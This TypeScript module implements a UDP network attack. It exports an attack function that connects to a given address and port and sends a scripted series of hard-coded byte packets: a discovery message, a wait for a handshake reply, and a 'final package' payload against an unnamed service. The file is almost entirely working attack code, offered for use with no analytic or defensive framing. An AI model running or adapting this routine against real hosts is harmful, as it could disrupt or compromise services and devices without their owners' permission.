import * as dgram from "dgram";
import * as _ from "underscore";

const messageStage1 = [
	1, 2, 0, 42, 49, 127, 0, 0, 1, 0,
	0, 0, 0, 0, 0, 0, 0, 2, 0, 42,
	49, 127, 0, 0, 1, 0, 0, 0, 0, 0,
	0, 0, 0, 109, 44, 0, 0
];

const smallMessage = [3];

const messageStage2 = [
	5, 110, 115, 101, 217, 255, 196, 110, 72, 141, 124, 161,
	146, 49, 52, 114, 149, 16, 0, 1, 0, 40, 0, 0,
	0, 1, 9, 112, 114, 111, 102, 105, 108, 101, 49, 112,
	0, 0, 0, 0, 0, 81, 57, 68, 0, 74, 2, 65,
	8, 0, 0, 0, 0, 0, 0, 0, 0, 51, 1, 0,
	0, 18, 0, 0, 0
];

enum AttackType {
	Send = 1,
	Wait = 2
}

interface AttackStep {
	type: AttackType;
	message: number[];
	intervalMessage?: number[];
	comment: string;
}

const AttackRoutine: AttackStep[] = [
	{
		type: AttackType.Send,
		message: messageStage1,
		comment: "Discover"
	},
	{
		type: AttackType.Wait,
		message: smallMessage,
		intervalMessage: messageStage1,
		comment: "First wait"
	},
	{
		type: AttackType.Send,
		message: smallMessage,
		comment: "Send a small message"
	},
	/*{
		type: AttackType.Wait,
		message: smallMessage,
		intervalMessage: smallMessage,
		comment: "Second wait"
	},*/
	{
		type: AttackType.Send,
		message: messageStage2,
		comment: "Send final package"
	}
]


function sendMessage(socket: any, message: number[]): Promise<any> {
	return new Promise(done => {
		socket.send(Buffer.from(message), done);
	});
}

let currentWait: (msg: Buffer, rinfo: any) => Promise<void> = null;
function waitForReply(socket: any, messageToWait: number[], timeout: number, intervalMessage?: number[]): Promise<boolean> {
	let intv;
	if (intervalMessage) {
		intv = setInterval(sendMessage, 500, socket, intervalMessage);
	}
	return new Promise(done => {
		currentWait = async (msg: Buffer, rinfo: any) => {
			if (_.isEqual(msg.toJSON().data, messageToWait)) {
				if (intv) {
					clearInterval(intv);
				}
				currentWait = null;
				done(true);
			}
		};
		setTimeout(() => {
			if (intv) {
				clearInterval(intv);
			}
			currentWait = null;
			done(false);
		}, timeout);
	});
}

async function performStep(socket: any, step: AttackStep, timeout: number): Promise<string> {
	let err;
	switch (step.type) {
		case AttackType.Send: {
			err = await sendMessage(socket, step.message);
			if (err) {
				return `Failed to perform step ${step.comment}: ${err.toString}`;
			}
			break;
		}
		case AttackType.Wait: {
			if (!await waitForReply(socket, step.message, timeout, step.intervalMessage)) {
				return `Empty reply on step ${step.comment}.`;
			}
			break;
		}
		default: {
			return "Unknown step";
		}
	}
	return null;
}

export async function attack(address: string, port: number, timeout: number): Promise<string> {
	const socket = dgram.createSocket("udp4");
	let err: string = null;
	let connectionError: any = await new Promise(done => {
		socket.connect(port, address, done);
	});
	if (connectionError) {
		socket.close();
		return `Failed to connect: ${connectionError.toString()}`;
	}
	socket.on("message", async (msg, rinfo) => {
		if (currentWait) {
			currentWait(msg, rinfo);
		}
	})
	for (let step of AttackRoutine) {
		err = await performStep(socket, step, timeout);
		if (err) {
			break;
		}
	}
	socket.close();
	return err;
}
